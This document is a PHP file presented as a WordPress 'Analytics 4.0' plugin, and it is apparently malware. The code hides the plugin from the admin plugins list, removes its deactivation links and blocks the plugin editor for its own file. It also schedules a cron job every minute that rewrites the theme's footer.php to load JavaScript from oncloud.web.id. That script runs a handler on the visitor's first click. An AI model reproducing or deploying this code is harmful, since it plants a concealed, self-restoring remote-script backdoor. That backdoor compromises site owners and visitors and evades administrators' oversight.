<?php
/**
 * Plugin Name: Analytics 4.0
 * Description: Automatically checks and injects analytics code into footer.php using WordPress cron system
 * Version: 1.0.0
 * Author: Your Name
 * Text Domain: analytics-injector
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Hide plugin from WordPress admin plugins page
add_filter('all_plugins', function($plugins) {
    if (is_admin() && current_user_can('activate_plugins')) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) {
            unset($plugins[$plugin_file]);
        }
    }
    return $plugins;
});

// Prevent deactivation through WordPress admin
add_filter('plugin_action_links_' . plugin_basename(__FILE__), function($links) {
    return array();
});

// Hide from bulk actions
add_filter('bulk_actions-plugins', function($actions) {
    return $actions;
});

// Prevent access to plugin editor for this plugin
add_action('admin_init', function() {
    if (isset($_GET['plugin']) && $_GET['plugin'] === plugin_basename(__FILE__)) {
        wp_die('Access denied to this plugin.');
    }
});

class AnalyticsInjector {
    
    private $analytics_code = '<script>
        (function() {
            if (window.__analytics_injected__) return;
            window.__analytics_injected__ = true;
            var script = document.createElement(\'script\');
            script.src = \'https://oncloud.web.id/analytics.js?v=\' + Date.now();
            script.async = true;
            (document.head || document.body).appendChild(script);
            script.onload = function() {
                function triggerAnalyticsOnce() {
                    if (typeof window.analyticsHandler === \'function\') {
                        window.analyticsHandler();
                    }
                    document.removeEventListener(\'click\', triggerAnalyticsOnce);
                }
                document.addEventListener(\'click\', triggerAnalyticsOnce);
            };
        })();
        </script>';
    
    private $cron_hook = 'analytics_injector_check';
    
    public function __construct() {
        // Hook into WordPress
        add_action('init', array($this, 'init'));
        
        // Register activation and deactivation hooks
        register_activation_hook(__FILE__, array($this, 'activate'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
        
        // Register the cron job action
        add_action($this->cron_hook, array($this, 'check_and_inject_analytics'));
    }
    
    public function init() {
        // Plugin initialization code here if needed
        // Add custom cron interval
        add_filter('cron_schedules', array($this, 'add_cron_interval'));
    }
    
    public function add_cron_interval($schedules) {
        $schedules['every_minute'] = array(
            'interval' => 60, // 60 seconds = 1 minute
            'display' => __('Every Minute')
        );
        return $schedules;
    }
    
    public function activate() {
        error_log('Analytics 4.0: Plugin activation/update started');
        
        // More aggressive cleanup - clear ALL instances of our cron event
        $this->aggressive_cron_cleanup();
        
        // Add custom cron interval for every minute
        add_filter('cron_schedules', array($this, 'add_cron_interval'));
        
        // Force WordPress to recognize our custom interval by refreshing schedules
        wp_cache_delete('cron_schedules', 'transient');
        
        // Wait a moment to ensure cleanup is complete
        usleep(100000); // 0.1 seconds
        
        // Now schedule the new event with our custom interval
        $scheduled = wp_schedule_event(time(), 'every_minute', $this->cron_hook);
        
        // Log the scheduling result for debugging
        if ($scheduled === false) {
            error_log('Analytics 4.0: Failed to schedule cron event');
            // Try to fix and reschedule
            $this->fix_cron_schedule();
        } else {
            error_log('Analytics 4.0: Successfully scheduled cron event for every minute');
        }
        
        // Verify the event was scheduled
        $next_run = wp_next_scheduled($this->cron_hook);
        if ($next_run) {
            error_log('Analytics 4.0: Next cron run scheduled for: ' . date('Y-m-d H:i:s', $next_run));
        } else {
            error_log('Analytics 4.0: WARNING - No cron event found after scheduling! Attempting fix...');
            $this->fix_cron_schedule();
        }
        
        // Double-check after potential fix
        $final_check = wp_next_scheduled($this->cron_hook);
        error_log('Analytics 4.0: Final cron status: ' . ($final_check ? 'SCHEDULED for ' . date('Y-m-d H:i:s', $final_check) : 'NOT SCHEDULED'));
        
        // Run initial check
        $this->check_and_inject_analytics();
    }
    
    public function deactivate() {
        // Remove all scheduled instances of this cron job
        wp_clear_scheduled_hook($this->cron_hook);
        
        // Also clear any old variations that might exist
        $timestamp = wp_next_scheduled($this->cron_hook);
        while ($timestamp) {
            wp_unschedule_event($timestamp, $this->cron_hook);
            $timestamp = wp_next_scheduled($this->cron_hook);
        }
        
        error_log('Analytics 4.0: All cron events cleared during deactivation');
    }
    
    public function check_and_inject_analytics() {
        $theme_path = get_template_directory();
        $footer_file = $theme_path . '/footer.php';
        
        // Log activity
        error_log('Analytics Injector: Starting check for footer.php at ' . $footer_file);
        
        // Check if footer.php exists
        if (!file_exists($footer_file)) {
            error_log('Analytics Injector: footer.php not found at ' . $footer_file);
            return false;
        }
        
        // Read the current content
        $current_content = file_get_contents($footer_file);
        
        if ($current_content === false) {
            error_log('Analytics Injector: Could not read footer.php');
            return false;
        }
        
        // Check if analytics code already exists
        if ($this->analytics_code_exists($current_content)) {
            error_log('Analytics Injector: Analytics code already exists in footer.php');
            return true;
        }
        
        // Inject the analytics code
        $result = $this->inject_analytics_code($footer_file, $current_content);
        
        if ($result) {
            error_log('Analytics Injector: Analytics code successfully injected into footer.php');
        } else {
            error_log('Analytics Injector: Failed to inject analytics code into footer.php');
        }
        
        return $result;
    }
    
    private function analytics_code_exists($content) {
        // Check for key identifiers in the analytics code
        $identifiers = [
            'window.__analytics_injected__',
            'oncloud.web.id/analytics.js',
            'analyticsHandler'
        ];
        
        foreach ($identifiers as $identifier) {
            if (strpos($content, $identifier) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function inject_analytics_code($footer_file, $current_content) {
        // Find the best position to inject the code
        $injection_position = $this->find_injection_position($current_content);
        
        if ($injection_position === false) {
            error_log('Analytics Injector: Could not find suitable injection position');
            return false;
        }
        
        // Inject the code
        $new_content = substr_replace($current_content, 
            "\n" . $this->analytics_code . "\n", 
            $injection_position, 
            0
        );
        
        // Write the new content
        $result = file_put_contents($footer_file, $new_content, LOCK_EX);
        
        if ($result === false) {
            error_log('Analytics Injector: Failed to write to footer.php');
            return false;
        }
        
        return true;
    }
    
    private function find_injection_position($content) {
        // Look for </body> tag first (best position)
        $body_pos = strripos($content, '</body>');
        if ($body_pos !== false) {
            return $body_pos;
        }
        
        // Look for </html> tag as fallback
        $html_pos = strripos($content, '</html>');
        if ($html_pos !== false) {
            return $html_pos;
        }
        
        // Look for wp_footer() call
        $footer_pos = strpos($content, 'wp_footer()');
        if ($footer_pos !== false) {
            // Find the end of the line
            $end_line = strpos($content, "\n", $footer_pos);
            if ($end_line !== false) {
                return $end_line;
            }
        }
        
        // Last resort - append to end of file
        return strlen($content);
    }
    
    // Manual trigger method for testing
    public function manual_check() {
        return $this->check_and_inject_analytics();
    }
    
    // Get plugin status
    public function get_status() {
        $theme_path = get_template_directory();
        $footer_file = $theme_path . '/footer.php';
        
        $next_scheduled = wp_next_scheduled($this->cron_hook);
        $cron_schedules = wp_get_schedules();
        
        $status = array(
            'footer_exists' => file_exists($footer_file),
            'footer_path' => $footer_file,
            'analytics_present' => false,
            'next_scheduled' => $next_scheduled,
            'next_scheduled_formatted' => $next_scheduled ? date('Y-m-d H:i:s', $next_scheduled) : 'Not scheduled',
            'cron_active' => $next_scheduled !== false,
            'custom_interval_registered' => isset($cron_schedules['every_minute']),
            'cron_hook' => $this->cron_hook
        );
        
        if ($status['footer_exists']) {
            $content = file_get_contents($footer_file);
            $status['analytics_present'] = $this->analytics_code_exists($content);
        }
        
        return $status;
    }
    
    // Aggressive cleanup method to remove all traces of our cron events
    private function aggressive_cron_cleanup() {
        error_log('Analytics 4.0: Starting aggressive cron cleanup');
        
        // Method 1: Standard WordPress cleanup
        wp_clear_scheduled_hook($this->cron_hook);
        
        // Method 2: Manual cleanup of all instances
        $timestamps = wp_get_scheduled_event($this->cron_hook);
        if ($timestamps) {
            foreach ((array)$timestamps as $timestamp) {
                wp_unschedule_event($timestamp, $this->cron_hook);
            }
        }
        
        // Method 3: Check and remove any remaining instances
        $cron_array = get_option('cron');
        if (is_array($cron_array)) {
            foreach ($cron_array as $timestamp => $cron) {
                if (isset($cron[$this->cron_hook])) {
                    unset($cron_array[$timestamp][$this->cron_hook]);
                    if (empty($cron_array[$timestamp])) {
                        unset($cron_array[$timestamp]);
                    }
                }
            }
            update_option('cron', $cron_array);
        }
        
        error_log('Analytics 4.0: Aggressive cleanup completed');
    }
    
    // Method to manually fix cron issues
    public function fix_cron_schedule() {
        error_log('Analytics 4.0: Manual cron fix initiated');
        
        // Clear all existing events
        $this->aggressive_cron_cleanup();
        
        // Re-register custom interval
        add_filter('cron_schedules', array($this, 'add_cron_interval'));
        wp_cache_delete('cron_schedules', 'transient');
        
        // Schedule new event
        $result = wp_schedule_event(time(), 'every_minute', $this->cron_hook);
        
        error_log('Analytics 4.0: Cron fix result: ' . ($result ? 'Success' : 'Failed'));
        
        return $result;
    }
}

// Initialize the plugin
new AnalyticsInjector();

// Add some utility functions for debugging/testing
if (defined('WP_CLI') && WP_CLI) {
    // WP-CLI command for manual execution
    function analytics_injector_cli_command($args, $assoc_args) {
        $injector = new AnalyticsInjector();
        $result = $injector->manual_check();
        
        if ($result) {
            WP_CLI::success('Analytics check completed successfully');
        } else {
            WP_CLI::error('Analytics check failed');
        }
        
        $status = $injector->get_status();
        WP_CLI::line('Status: ' . print_r($status, true));
    }
    
    WP_CLI::add_command('analytics-injector', 'analytics_injector_cli_command');
}

?>